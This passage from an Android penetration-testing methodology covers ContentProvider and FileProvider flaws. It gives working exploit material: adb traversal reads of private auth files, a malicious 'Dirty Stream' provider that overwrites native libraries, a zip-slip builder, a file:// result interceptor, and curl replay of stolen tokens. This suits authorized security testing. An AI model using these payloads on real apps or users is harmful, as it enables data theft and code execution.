- **Ruled out when:** Every MIME-typed filter also declares `<data android:scheme="content"/>` (or the
  handler validates the scheme in code before opening), and your `file://` probe is rejected.

### D07-053 · Non-exported provider reached through the app's own URI sink

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured file-theft checklist: "It's important to note that they do not necessarily need to be exported. Android only checks rights when an attempt is made to access data, but the vulnerable app will be receiving access to one of its resources, and no restrictions will come into play." |

- **Test:** The vector most testers skip after reading `exported="false"`. Android checks the rights of the
  *accessing* process — and the accessing process is the victim, which already has full rights to its own
  provider. Point any URI sink in the app at its own non-exported authority, with a traversal payload.
- **How:**
```bash
grep -nE 'android:exported="false"' -B4 out/AndroidManifest.xml | grep -A4 '<provider'
# find any externally-reachable path where a Uri arrives and is opened
grep -rnE 'getParcelableExtra\([^)]*Uri|intent\.getData\(\)|getQueryParameter\("(uri|url|file|path|src)"\)' out/sources/
# then aim it at the app's own internal authority
adb shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
  -d 'content://com.target.app.internal/secrets/1'
adb shell am start -n com.target.app/.ImportActivity \
  --eu android.intent.extra.STREAM 'content://com.target.app.internal/../../shared_prefs/auth.xml'
```
- **Proof:** The app copies its own private file into public storage, attaches it to an outbound message,
  or renders it — with the non-exported authority visible in the URI you supplied. Capture the resulting
  file or HTTP body.
- **Escalation:** -> D08 for a cleaner delivery; -> D07-062 for the side-effect variant, where the sink is
  a `query()` on an internal debug URI.
- **Ruled out when:** No externally-reachable component passes a caller-supplied `Uri` to
  `ContentResolver`, or every such path validates `belongsToCurrentApplication()` before opening. This is
  the check that must pass before any `exported="false"` provider goes into the ruled-out register.

### D07-054 · FileProvider `<paths>` rooted at `/`, `.` or empty

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) when reachable; `server_security_misconfiguration.path_traversal` (VARIES) for the configuration |
| **Attacker** | AM-03 (needs an exported provider or a grant primitive) |
| **Applies to** | all apps declaring a FileProvider |
| **Maps to** | MASTG-TEST-0357, MASTG-TECH-0159, rule `mastg-android-fileprovider-broad-scope.yml`, MASWE-0018 (CWE-939, CWE-940), MASWE-0002; `risks/file-providers` — "Do not use `<root-path>` in the configuration ... could enable an attacker to access sensitive information stored in databases or overwrite the application's native libraries"; AndroidX `FileProvider.java` `TAG_ROOT_PATH` -> `"/"`; H1 #1161401 (Nextcloud, Low 1.3, $250); Oversecured TikTok `<root-path name="name" path="" />` |

- **Test:** The paths XML is the whole access-control surface of a FileProvider. Each element maps a URI
  prefix (`name`) to a real directory (`path`):

| Element | Maps to |
|---|---|
| `<files-path>` | `Context.getFilesDir()` |
| `<cache-path>` | `Context.getCacheDir()` |
| `<external-path>` | `Environment.getExternalStorageDirectory()` |
| `<external-files-path>` | `getExternalFilesDirs(null)[0]` |
| `<external-cache-path>` | `getExternalCacheDirs()[0]` |
| `<external-media-path>` | `getExternalMediaDirs()[0]` |
| `<root-path>` | **the device root `/`** |

  `path="."`, `path="/"` and `path=""` each map the whole of the element's base directory.
- **How:**
```bash
xmlstarlet sel -t -m "//provider/meta-data[@android:name='android.support.FILE_PROVIDER_PATHS']" \
  -v "../@android:authorities" -o " -> " -v "@android:resource" -n out/AndroidManifest.xml
cat out/res/xml/*paths*.xml out/res/xml/*file*path*.xml 2>/dev/null
python3 - <<'PY'
import glob, re, xml.dom.minidom as m
TAGS = ('root-path','files-path','cache-path','external-path','external-files-path',
        'external-cache-path','external-media-path')
for f in glob.glob('out/res/xml/*.xml'):
    try: d = m.parse(f)
    except Exception: continue
    for t in TAGS:
        for n in d.getElementsByTagName(t):
            p = n.getAttribute('path')
            if t == 'root-path' or p == '' or re.match(r'^[/\.\*]/?$', p or ''):
                print('DANGEROUS', f, t, 'name=' + n.getAttribute('name'), 'path=' + repr(p))
PY
# then read through it
adb shell content read --uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/auth.xml'
adb shell content read --uri 'content://com.target.app.fileprovider/files/../databases/app.db' | head -c 64 | xxd
```
- **Proof:** The XML line itself, **plus** a `content read` returning bytes the feature never intended to
  share — `<string name="access_token">` from `shared_prefs`, or `SQLite format 3` from `databases/`. The
  config alone is Medium at best; the read is the finding.
- **Escalation:** -> D08 to obtain the grant if the provider is not exported; -> D11/D13 for the payload;
  -> D17 if `openFile` also honours `"w"` and the reachable tree contains a code path.
- **Ruled out when:** Every element names a specific subdirectory (`<files-path name="shared" path="shared/"/>`)
  and none is `root-path` or `path` in `{"", ".", "/"}` — and a probe for a sibling directory returns
  `IllegalArgumentException: Failed to find configured root that contains ...`.

### D07-055 · `<external-path>` and the shared-volume exposure

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) for the resting data; the provider read is what lifts it |
| **Attacker** | AM-03/AM-04 |
| **Applies to** | apps declaring `<external-path>` |
| **Maps to** | MASTG-TEST-0357; `risks/file-providers` — `<external-path>` should be avoided "unless you have explicitly verified that the information being stored/shared is not sensitive. Never store PII using this element"; MASTG-KNOW-0042 (external storage, `owner_package_name` attribution) |

- **Test:** `<external-path>` maps the shared volume, which is not part of the app sandbox at all. Anything
  the provider serves from there is also reachable by other means, and anything an attacker writes there is
  served *by the provider* — which launders attacker content into the app's own trusted authority.
- **How:**
```bash
grep -rn 'external-path\|external-files-path\|external-media-path' out/res/xml/
adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download
# write into the mapped directory from a second app, then read it back through the victim's authority
adb shell 'echo zq7x4kd9m2 > /sdcard/Download/planted.txt'
adb shell content read --uri 'content://com.target.app.fileprovider/external/Download/planted.txt'
```
- **Proof:** Your planted marker returned through the victim's authority, or a per-user document (invoice,
  KYC image, chat attachment) readable at rest on the shared volume.
- **Escalation:** The attacker-writable half feeds D17 (the app imports its own "trusted" file) and D07-059.
  The readable half is a D11/D20 payload.
- **Ruled out when:** No `external*` element exists, or every one names a subdirectory containing only
  non-sensitive, app-generated content that the app also treats as untrusted on read (show the validation).

### D07-056 · `FileProvider.getUriForFile()` called with attacker-controlled input

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03/AM-02 |
| **Applies to** | all apps calling `getUriForFile` |
| **Maps to** | MASTG-TEST-0357 — "Determine whether `FileProvider.getUriForFile()` is called with attacker-controlled input (for example, values derived from URI query parameters or user input)"; MASTG-TECH-0159, MASTG-KNOW-0138 |

- **Test:** Even a narrowly-scoped provider becomes a read primitive if the `File` argument comes from
  outside. The app then mints a `content://` URI for a path you chose, grants it with
  `FLAG_GRANT_READ_URI_PERMISSION`, and hands you the bytes. This is the classic
  intent-redirection-to-arbitrary-file-read chain, and the provider's scope only limits which paths the
  call succeeds for.
- **How:**
```bash
grep -rn 'getUriForFile(' out/sources/
# for each hit, trace the File argument backwards in jadx to its source
grep -rn -B12 'getUriForFile(' out/sources/ \
  | grep -inE 'getQueryParameter|getStringExtra|getPathSegments|DISPLAY_NAME|getData\(\)'
adb shell am start -n com.target.app/.ShareActivity \
  --es filename '../databases/app.db'
adb shell am start -W -a android.intent.action.VIEW \
  -d 'targetapp://share?file=..%2F..%2Fshared_prefs%2Fauth.xml'
```
- **Proof:** A deep link or intent that makes the app mint a URI for a path you chose, grant it to you, and
  return the bytes — capture the `dumpsys activity permissions` grant line and the read together.
- **Escalation:** -> D08, -> D09 for the delivery; the write direction (the app writes *to* the path you
  named) -> D17.
- **Ruled out when:** Every `getUriForFile` argument is constructed from a constant directory plus a name
  the app generated itself (`File.createTempFile`, a UUID, a hash) — show the construction and a failed
  traversal attempt on the parameter you controlled.

### D07-057 · Concede what FileProvider actually blocks — `files/` and `cache/`, not `shared_prefs/`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the recovered file is a live backend credential |
| **Attacker** | AM-03 |
| **Applies to** | CURRENT AndroidX FileProvider |
| **Maps to** | AndroidX `FileProvider.java` canonicalisation; triage-pushback discipline (concede the unreachable half) |

- **Test:** `<files-path path="."/>` exposes the whole of `getFilesDir()`, but AndroidX `FileProvider`
  canonicalises the resolved file and throws when it escapes the configured root — so
  `content://<pkg>.fileprovider/files/../shared_prefs/<pkg>.xml` genuinely fails. Attempt it, record the
  failure, and then enumerate what *is* inside `files/`. Conceding the unreachable half is what makes the
  reachable half credible to a triager.
- **How:**
```bash
adb shell content read --uri 'content://com.target.app.fileprovider/files/../shared_prefs/com.target.app.xml'
# expect: IllegalArgumentException: Failed to find configured root that contains /data/.../shared_prefs/...
adb shell run-as com.target.app find /data/data/com.target.app/files -type f 2>/dev/null
adb shell run-as com.target.app find /data/data/com.target.app/cache -type f 2>/dev/null
# then read the prize that IS in files/
adb shell content read --uri 'content://com.target.app.fileprovider/files/session_backup.json'
```
- **Proof:** Two artefacts: the traversal attempt failing with the exact `Failed to find configured root`
  exception, **and** a plain file inside `files/` that reads successfully — typically a session backup
  written by the app's own backup agent, carrying the token plus the user's identity.
- **Escalation:** Render the *identity* (name, phone, email, user id, wallet) alongside the token rather
  than replaying the token — it is a stronger and safer impact statement (-> D23/D27). Then D15.
- **Ruled out when:** `files/` and `cache/` contain nothing sensitive on a fully-exercised app (log in,
  use the main flows, then re-enumerate — a first-launch enumeration proves nothing).

### D07-058 · `grantUriPermissions="true"` on a FileProvider is mandatory, not the defect

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate) |
| **Attacker** | n/a |
| **Applies to** | all FileProviders |
| **Maps to** | MASTG-TEST-0250, MASTG-TEST-0357 — `android:grantUriPermissions` **must** be `true` for a FileProvider by definition, otherwise it throws `SecurityException: Provider must grant uri permissions` |

- **Test:** Scanners and inexperienced testers file `grantUriPermissions="true"` on a FileProvider as a
  finding. It is a functional requirement of the class. The defect is always the **path scope** (D07-054)
  or the **grant delivery** (D07-021/-022), never the attribute's presence.
- **How:**
```bash
grep -n -B2 -A6 'androidx.core.content.FileProvider\|android.support.v4.content.FileProvider' out/AndroidManifest.xml
# confirm the class before judging the attribute
```
- **Proof:** n/a — this is a filter. If the provider class is (or extends) `FileProvider`, drop the
  attribute observation and go to D07-054.
- **Escalation:** n/a.
- **Ruled out when:** n/a. Note the inverse is a real signal: `grantUriPermissions="true"` on a provider
  that is **not** a FileProvider is a deliberate choice and goes to D07-021.

### D07-059 · Dirty Stream — trusting `DISPLAY_NAME` from a foreign ContentProvider

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is shown; `server_security_misconfiguration.path_traversal` (VARIES) for the write |
| **Attacker** | AM-03 (the victim must open/accept the share — one interaction) |
| **Applies to** | every app with a share target, attachment, file-import or "open with" flow |
| **Maps to** | `risks/untrustworthy-contentprovider-provided-filename` — **CWE-73: External Control of Filename or Path**, MASVS-CODE; MASWE-0050; Microsoft "Dirty Stream" (2024-05-01): Xiaomi File Manager `com.mi.android.globalFileexplorer` 1B+ installs (vulnerable V1-210567, fixed V1-210593), WPS Office `cn.wps.moffice_eng` 500M+ installs (vulnerable 16.8.1, fixed 17.0.0), 4B+ installs total; H1 #1115864 (Mattermost, High 7.8), #1362313 / #1377748 (Evernote, same root cause) |

- **Test:** The inverted direction, and the single most commonly missed ContentProvider test. When the app
  receives a `content://` URI it queries the **sender's** provider for `OpenableColumns.DISPLAY_NAME` and
  frequently uses that string as the destination filename. The attacker controls both the name and the
  bytes.
- **How:** The vulnerable consumer shape:
```java
String displayName = returnCursor.getString(nameIndex);
String filePath = new File(context.getFilesDir(), displayName).getPath();
FileOutputStream outputStream = new FileOutputStream(filePath);
```
```bash
grep -rnE 'OpenableColumns|DISPLAY_NAME|"_display_name"|getColumnIndex\(' out/sources/ -A12 \
  | grep -nE 'new File\(|FileOutputStream|copyTo|createNewFile|getCanonicalPath'
grep -rn 'new File(' out/sources/ | grep -iE 'displayname|fileName|name\)'
```
  The attacker provider:
```java
@Override public Cursor query(Uri uri, String[] p, String s, String[] a, String o) {
    MatrixCursor c = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
    c.addRow(new Object[]{uri.getQueryParameter("name"), payload.length});   // "../../lib-main/libyoga.so"
    return c;
}
@Override public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), MODE_READ_ONLY);
}
```
```xml
<provider android:name=".EvilContentProvider" android:authorities="com.poc.evil"
          android:enabled="true" android:exported="true" />
```
```java
Intent i = new Intent(Intent.ACTION_SEND).setType("application/*")
  .setClassName("com.target.app", "com.target.app.share.ShareActivity")
  .putExtra(Intent.EXTRA_STREAM, Uri.parse(
     "content://com.poc.evil/?path=/data/data/com.poc/libevil.so&name=../../lib-main/libyoga.so"))
  .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivity(i);
```
- **Proof:** `adb shell run-as com.target.app ls -la /data/data/com.target.app/lib-main/` showing your
  library in place with your bytes, then the app loading it (a log line from your `JNI_OnLoad`) or crashing
  on next launch. On a release build, prove it by the behaviour change and say which you used.
- **Escalation:** The Xiaomi chain is the template worth reproducing: (1) write `files/lib/libixiaomifileu.so`;
  (2) abuse `SharedPreferencesImpl`'s `.bak` swap to overwrite the stored hash in
  `com.mi.android.globalFileexprorer_preferences.xml`; (3) invoke the junk-cleaner plugin by explicit intent
  so the app `System.load()`s your library because the hashes now match. -> D17.
- **Ruled out when:** The destination filename is generated by the app (`File.createTempFile`, a UUID, a
  content hash) rather than taken from the cursor, **or** the app canonicalises and prefix-checks the
  destination before writing. Note Microsoft's mechanism caveat, which is testable: a `checkValid`-style
  guard written for file paths "always returns true for a content URI" because normalisation turns it into
  `/content:/` — so the presence of a validation helper is not sufficient; read what it actually compares.

### D07-060 · Implicit-intent result interception returning a `file://` URI

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 (the victim must pick your app in the chooser, or you win on priority) |
| **Applies to** | apps calling `startActivityForResult` with `ACTION_PICK` / `ACTION_GET_CONTENT` / `IMAGE_CAPTURE` / `CROP` |
| **Maps to** | Oversecured "theft of arbitrary files" Class #13 and the 7-vector list; H1 #288955, #161710 |

- **Test:** The victim launches a picker; a malicious responder returns a `file://` URI pointing at the
  victim's own private file; the victim copies it somewhere you can read. Registering a high-priority
  exported responder for the picker action is the whole attacker setup. This is the read direction; the
  write direction is D07-059's `DISPLAY_NAME`.
- **How:**
```bash
grep -rnE 'startActivityForResult\(.*(ACTION_PICK|ACTION_GET_CONTENT|IMAGE_CAPTURE|ACTION_CROP|OPEN_DOCUMENT)' out/sources/
grep -rn -A25 'onActivityResult' out/sources/ \
  | grep -inE 'openInputStream|FileOutputStream|copy|getExternalCacheDir|getExternalFilesDir'
```
  Attacker side — register `android:priority="999"` on the matching filter, relax StrictMode so you are
  allowed to emit a `file://`, and return the victim's own path:
```java
StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());   // LAX
setResult(RESULT_OK, new Intent().setData(Uri.parse(
    "file:///data/user/0/com.target.app/shared_prefs/secrets.xml")));
finish();
```
- **Proof:** The victim's secrets landing in a directory your app can read
  (`/sdcard/Android/data/com.target.app/cache/...` or a public dir), dumped by your PoC with the token
  visible. Show the pre-state (file absent) and post-state (file present with the victim's content).
- **Escalation:** -> D11/D13. The write variant of the same interception (returning a provider whose
  `DISPLAY_NAME` traverses) -> D07-059 -> D17.
- **Ruled out when:** `onActivityResult` rejects the `file` scheme, resolves the real path via
  `openFileDescriptor` + `/proc/self/fd` `readSymbolicLink` and checks it is under `dataDir`, or writes the
  received data to internal storage only and never to a location another app can read.

### D07-061 · DocumentsProvider / SAF restore-import traversal in the consumer

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loaded artefact |
| **Attacker** | AM-03 |
| **Applies to** | apps with restore, import or migration flows that accept tree/document URIs |
| **Maps to** | HackTricks `android-applications-basics.md` "DocumentProvider restore/import path traversal"; H1 #859469 (LINE Android, ZIP extract traversal, $475), #284346 |

- **Test:** When an exported receiver, service or activity accepts `DocumentsContract` tree/document URIs
  and copies them locally, the bug usually lives in the *consumer*: it derives the destination from
  `DocumentsContract.getDocumentId(srcUri)` with string operations and hands it to `new File(...)`. An
  attacker provider returns a document id containing encoded traversal. The same shape recurs in archive
  extraction (`zip slip`).
- **How:**
```bash
grep -rnE 'DocumentsContract\.(getDocumentId|getTreeDocumentId|buildChildDocumentsUriUsingTree)|takePersistableUriPermission' out/sources/
grep -rnE 'SAVE_URI_PATHS|EXTRA_STREAM|getClipData\(\)|getParcelableArrayListExtra' out/sources/ -A12 \
  | grep -inE 'mkdirs|new File\(|FileOutputStream|openInputStream'
grep -rnE 'ZipInputStream|ZipFile\.entries|getNextEntry|TarArchiveInputStream' out/sources/
grep -rn 'getCanonicalPath' out/sources/     # absence is the finding
```
  Serve an attacker provider whose document id encodes traversal
  (`data%2F..%2Fpayload.apk` -> `data/../payload.apk`), or build the archive form:
```bash
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('evil.zip','w')
z.writestr('../../../../data/data/com.target.app/files/libpwn.so', open('libpwn.so','rb').read())
z.close()
PY
adb push evil.zip /sdcard/ && adb shell am start -a android.intent.action.VIEW \
  -d 'file:///sdcard/evil.zip' -t application/zip -n com.target.app/.ImportActivity
```
- **Proof:** A file you supplied appearing outside the intended directory inside the victim's sandbox:
  `adb shell run-as com.target.app ls -l <escaped path>` with your bytes.
- **Escalation:** -> D17 when the overwritten file is a cached plugin, a downloaded APK, a `.dex`/`.jar` or
  a restore target the app later loads. Android 14 (targetSdk 34) adds `ZipPathValidator` for the **zip**
  variant only — it does nothing for provider-supplied document ids, so state which variant you exploited.
- **Ruled out when:** The consumer canonicalises each destination and checks
  `startsWith(<allowed_dir>)` before `mkdirs`/write — show the check and a rejected traversal — and, for
  the zip variant, the app targets 34+ with `ZipPathValidator` active *and* the provider-id variant is also
  guarded.

### D07-062 · Side-effecting logic inside provider methods

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all — **including providers declared `exported="false"`** |
| **Maps to** | Oversecured Class #8; T1641 Data Manipulation |

- **Test:** Developers model providers as CRUD, so nobody audits the maintenance code they put inside them:
  a `query()` arm that dumps the database to `Downloads`, a `call()` method that re-encrypts a store, an
  `insert()` that shells out. Invoking an internal debug or maintenance routine from outside is the finding,
  and it usually lands data somewhere world-readable as a bonus.
- **How:**
```bash
grep -rn -A40 'public Cursor query(\|public Bundle call(\|public Uri insert(\|public ParcelFileDescriptor openFile(' out/sources/ \
  | grep -inE 'FileOutputStream|transferTo|Environment\.DIRECTORY_|getDatabasePath|Runtime\.exec|ProcessBuilder|Cipher|deleteDatabase|SharedPreferences\.Editor'
# find the UriMatcher arm that reaches it, then fire it
adb shell content query --uri content://com.target.app.internal/debug
adb shell content call  --uri content://com.target.app.internal --method exportDatabase
adb shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
```
- **Proof:** The side-effect artefact appearing (a database copy in `Downloads`, a log file, a re-issued
  token) and you reading it. Show the directory listing before and after.
- **Escalation:** When the provider is not exported, chain a URI sink so the victim calls
  `ContentResolver.query(content://com.target.app.internal/debug)` on itself (D07-053) — `exported="false"`
  is insufficient the moment the app feeds itself attacker URIs.
- **Ruled out when:** Every provider method is a pure data operation — no filesystem writes outside the
  provider's own backing store, no process execution, no credential mutation — verified by reading each
  `UriMatcher` arm and each `call()` branch, not by testing a sample of URIs.

### D07-063 · Exported `SliceProvider` whose `onBindSlice` acts on the URI

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-03/AM-04 (needs slice permission, or be a slice host) |
| **Applies to** | apps shipping AndroidX Slices |
| **Maps to** | `guide/slices/getting-started` (the documented provider XML with `android.app.slice.category.SLICE`); MASWE-0036 |

- **Test:** Slices are bound by external hosts (Assistant, system search), and the documented setup exports
  the provider on the stated basis that "all permission checks are handled internally". That holds for
  *slice permission* and for nothing else. A provider that branches on `sliceUri.path` and performs I/O,
  network calls or state changes is reachable by anything that can obtain slice permission — and by the
  app's own hosts. Declining in prevalence, so almost never reviewed.
- **How:**
```bash
grep -nB2 -A10 'android.app.slice.category.SLICE' out/AndroidManifest.xml
grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|grantSlicePermission|checkSlicePermission' out/sources/
adb shell content query --uri 'content://com.target.app/hello'
adb shell content query --uri 'content://com.target.app/account/balance'
```
- **Proof:** Non-idempotent behaviour observable from a bind — a request appearing in the proxy log, a file
  written, or account data returned in the slice's row titles and subtitles.
- **Escalation:** Slice content is rendered by the Assistant, so anything sensitive in a row title leaks to
  a surface outside the app -> D20.
- **Ruled out when:** No `SliceProvider` subclass exists, or `onBindSlice` returns only static content and
  calls `checkSlicePermission` before any data-bearing branch.

### D07-064 · `CloudMediaProvider` inside the Photo Picker

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | apps implementing or consuming a cloud media provider |
| **Maps to** | `training/data-storage/shared/photopicker` (cloud media providers), `guide/topics/providers/cloud-media-provider` |

- **Test:** The Photo Picker can surface media from an eligible cloud media provider. If the app under test
  *is* one, its provider is a cross-app data surface reachable from any app's picker; if it merely consumes
  the picker, it may receive URIs backed by a remote provider with different permission and latency
  semantics from local files.
- **How:**
```bash
grep -rnE 'CloudMediaProvider|cloud_media|android.content.action.CLOUD_MEDIA' out/sources/ out/AndroidManifest.xml
adb shell content query --uri 'content://com.target.app.cloudmedia/media'
adb shell dumpsys package com.target.app | grep -i cloud
```
- **Proof:** A `CloudMediaProvider` subclass returning items without verifying the requesting selection
  context — i.e. media outside the user's current selection returned to a caller.
- **Escalation:** -> D07-069 for the MediaStore side; -> D20 for bulk media disclosure.
- **Ruled out when:** No `CloudMediaProvider` subclass and no `CLOUD_MEDIA` action in the manifest. Related
  and worth one command while you are here: an app that requests `READ_MEDIA_IMAGES`/`_VIDEO`/`_AUDIO` and
  enumerates `MediaStore` instead of using the picker (which needs **no** permission) is over-collecting —
  `adb shell pm revoke com.target.app android.permission.READ_MEDIA_IMAGES` and see whether the feature
  still works through the picker.

### D07-065 · Rate the provider by what the rows contain, not by the fact it is exported

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a live backend credential; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for another user's records; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) otherwise |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0356, MASWE-0018; Google Mobile VRP "Theft of sensitive data": "Insecurely designed app internals like content providers or activities that can be manipulated to expose sensitive data", CWE-359; H1 #242727 (Nextcloud, bcrypt hashes of password-protected shares, Low, $75), #331302 (Nextcloud, `content://org.nextcloud/arbitrary_data` holding E2EE private keys), #272044 (Dropbox, $1,000); CVE-2019-14339 (Canon PRINT 2.5.5, EDB 47321) |

- **Test:** The severity is set entirely by the columns, so inventory them by sensitivity rather than
  reporting "provider is exported". Query every table of every reachable authority and classify each column:
  authentication material, other users' records, the device owner's PII, internal config, public content.
  Providers exist to share data — the bug is often not injection at all, it is that the rows contain things
  the developer forgot were secrets.
- **How:**
```bash
for P in $(cat /tmp/reachable_paths.txt); do
  echo "=== $P"
  drozer> run app.provider.columns "content://$P"
  adb shell content query --uri "content://$P" --projection "*" | head -5
done
# the GUI route that proves any third-party app can do it with no adb:
#   Content Provider Helper (com.jensdriller.contentproviderhelper)
```
- **Proof:** A redacted row with the sensitive column names left visible, alongside the
  `Required Permission - Read: null` line from `app.provider.info`. Real precedents to calibrate against:
  bcrypt hashes of password-protected share passwords plus the share token (crackable offline, bypassing
  the server's brute-force protection entirely); E2EE private keys; a printer's factory admin password,
  MAC address and WPA2-PSK material returned by a single `content query`.
- **Escalation:** -> D07-067 (take every token and identifier to the backend). Credential material ->
  D12 offline cracking; other users' rows -> D15 IDOR.
- **Ruled out when:** Every reachable column holds content the app publishes anyway (public catalogue,
  static config, the device's own locale), and no column is an identifier the backend accepts. State the
  column inventory in the ruled-out register, not just "nothing sensitive".

### D07-066 · Chain two providers — one names the object, the other returns its bytes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | apps with both a metadata provider and a file/thumbnail/cache provider |
| **Maps to** | H1 #534541 (Nextcloud, Low 3.4, $100), #489105 (the prior thumbnail issue) — `DiskLruImageCacheFileProvider` should not have been exported |

- **Test:** A provider that is "only" a file listing is not a finding on its own, and a cache provider that
  needs an exact filename is not either. Joined, they are a data-disclosure bug: the first leaks the names,
  the second turns a name into bytes. Neither team reviews them together.
- **How:**
```bash
# step 1: leak the filenames from the metadata provider
adb shell content query --uri content://org.nextcloud/file --projection "filename,path,has_preview"
# -> filename=1553357105332.jpg, path=/1553357105332.jpg, has_preview=1
# step 2: feed the name to the thumbnail/cache provider
adb shell content read --uri content://org.nextcloud.imageCache.provider/1553357105332.jpg > stolen.jpg
file stolen.jpg
# find the pairs systematically
grep -rn 'android:authorities' out/AndroidManifest.xml | grep -iE 'cache|image|thumb|preview|media|file'
```
- **Proof:** `stolen.jpg` opening as the victim's actual image, obtained by an app holding no storage
  permission. Show both steps and the resulting file.
- **Escalation:** Thumbnails rate Low; full-resolution content, documents or KYC images rate Medium+ ->
  D11/D20. Check every `*CacheFileProvider` / `*ImageProvider` / `*PreviewProvider` authority for the same
  join.
- **Ruled out when:** The cache/thumbnail authority is not exported and has no grant path (D07-021/-022), or
  it requires an opaque per-object token that the metadata provider does not return.

### D07-067 · Take provider rows to the backend — the mobile-to-backend shadow-API bridge

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-03 -> AM-01 |
| **Applies to** | all |
| **Maps to** | the shadow/zombie-API discipline — old versions stay reachable without receiving the same fixes, and **mobile builds are the number-one source of old-version endpoints**; H1 #518669 (a provider-recovered share token forged a working public URL) |

- **Test:** A provider row is not the end of the finding, it is the input to the next one. Providers carry
  session tokens, refresh tokens, share tokens, device ids, user ids, object ids and — frequently — the
  base URL and API version the mobile client uses. That version is routinely **older** than the one the web
  app calls, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Diff
  **behaviourally**, not by response shape.
- **How:**
```bash
# 1. inventory identifiers and hosts from the provider rows
adb shell content query --uri content://com.target.app.provider/session --projection "*"
adb shell content query --uri content://com.target.app.provider/config  --projection "*"
# 2. does the token work off-device, with no app?
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN" https://api.target.example/v1/me
# 3. behavioural version diff for the SAME operation
for v in v1 v2 v3 beta internal legacy; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/me\n" -H "Authorization: Bearer $TOKEN" \
    "https://api.target.example/api/$v/me"
done
curl -s -H "X-API-Version: 1" -H "Authorization: Bearer $TOKEN" https://api.target.example/api/me
# 4. forged public URLs from share-token-shaped columns
curl -s -o /dev/null -w '%{http_code}\n' "https://target.example/index.php/s/rkNCkcYcbGEBDQN"
```
  Diff four security-relevant behaviours between the mobile-era version and the current one: **auth
  strength** (does the old path accept a token the new one rejects?), **rate limiting** (burst both; a
  missing 429 means throttling was never backported), **input validation** (same payload to both), and
  **field exposure** (does the old path return internal ids or PII the current version redacts?).
- **Proof:** The same request against both versions, side by side, with the security regression visible in
  the response bodies. **A version difference alone is Informational — the weakened control is the
  finding.** For the share-token case, an unauthenticated 200 from a machine that never touched the device.
- **Escalation:** This is where a locally-scoped provider read becomes an AM-01 remote finding, and where
  the chapter's ceiling actually gets reached. -> D15 for the full API sweep, -> D13 for session handling.
  Note the adjacent mobile-auth inversions when you get there: a client-side-only rate limit the API never
  enforces is a real finding; an OAuth `client_secret` embedded in the app is never-submit, whereas **PKCE
  non-enforcement** is the reportable one.
- **Ruled out when:** Every identifier in the provider is device-local (a row id, a local cache key) and the
  extracted token is rejected off-device with a 401 that a valid token does not produce — show both the
  401 and a control 200.

### D07-068 · The Downloads provider and the signed URL that outlives the session

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the signed URL is replayable by anyone |
| **Attacker** | AM-03 |
| **Applies to** | apps using `DownloadManager` |
| **Maps to** | `reference/android/app/DownloadManager` — `Request.setDestinationInExternalPublicDir()`, `Request.addRequestHeader()`, `COLUMN_LOCAL_URI`, `Request.setVisibleInDownloadsUi()` |

- **Test:** Three questions, not one. Where does the downloaded document rest, is the download URL (with its
  query-string token) readable through the Downloads provider, and does `setVisibleInDownloadsUi(true)`
  expose a private document in the system Downloads UI. `addRequestHeader()` also attaches the app's
  `Authorization` header to the download, which is how signed URLs end up in a world-readable row.
